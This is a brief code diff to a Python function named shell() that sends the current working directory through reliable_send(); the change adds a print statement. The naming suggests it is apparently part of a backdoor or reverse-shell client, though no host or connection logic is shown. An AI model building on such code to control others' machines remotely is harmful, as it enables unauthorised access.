@@ -20,6 +20,7 @@ def shell():
             try:
                 files = os.getcwd()
                 files = str(files)
+                print(files)
                 reliable_send(files)
             except:
                 pass
